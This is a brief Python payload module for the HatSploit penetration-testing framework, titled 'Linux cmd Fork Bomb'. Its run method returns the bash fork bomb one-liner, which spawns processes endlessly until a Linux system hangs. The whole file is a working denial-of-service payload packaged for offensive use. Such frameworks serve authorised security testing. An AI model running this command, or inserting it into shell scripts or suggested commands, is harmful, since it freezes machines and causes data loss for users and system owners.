#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Name': "Linux cmd Fork Bomb",
        'Payload': "linux/cmd/fork_bomb",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Linux cmd fork bomb.",
        'Architecture': "cmd",
        'Platform': "linux",
        'Rank': "high",
        'Type': "one_side"
    }

    def run(self):
        return ':(){ :|: & };:'
